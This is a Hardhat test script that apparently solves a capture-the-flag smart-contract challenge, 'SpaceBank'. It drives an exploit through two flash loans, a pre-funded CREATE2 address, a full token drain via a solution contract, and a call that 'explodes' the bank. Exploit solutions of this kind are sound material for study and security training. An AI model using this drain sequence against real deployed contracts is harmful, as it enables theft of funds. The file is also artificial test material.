import { expect } from "chai";
import hre from "hardhat";

describe("SpaceBank", function () {
    it("Explode Bank", async function () {
        const [owner, addr1, addr2] = await hre.ethers.getSigners();

        // By default, Contract instances are connected to the first signer.
        const token = await hre.ethers.deployContract("SpaceToken");
        const spaceBank = await (await hre.ethers.getContractFactory("SpaceBank")).deploy(token);
        const spaceBankSolution = await (await hre.ethers.getContractFactory("SpaceBankSolution", addr1)).deploy(spaceBank, token);

        token.mint(spaceBank, 1000);

        // 1st flashloan, no fee needed for borrow 999 token
        await spaceBank.connect(addr1).flashLoan(999, spaceBankSolution);

        // precomupte address and deposit eth before contract is created
        const dummyTransferDeployTxn = await (await hre.ethers.getContractFactory("DummyTransfer")).getDeployTransaction();
        const salt = await hre.ethers.provider.getBlockNumber() + 2;
        const saltBytes = hre.ethers.zeroPadValue(hre.ethers.toBeHex(salt), 32)
        const dummyTransferAddress = hre.ethers.getCreate2Address(await spaceBank.getAddress(), saltBytes, hre.ethers.keccak256(dummyTransferDeployTxn.data));
        await addr1.sendTransaction({
            to: dummyTransferAddress,
            value: 10n ** 18n,
            gasLimit: 1e6,
        });

        // 2nd flashloan
        await spaceBank.connect(addr1).flashLoan(1, spaceBankSolution);

        // take away all token
        await spaceBankSolution.withdrawAll();
        console.log(await token.balanceOf(spaceBank), await token.balanceOf(spaceBankSolution));

        await spaceBank.explodeSpaceBank();
        expect(await spaceBank.exploded()).to.equal(true);
    });
});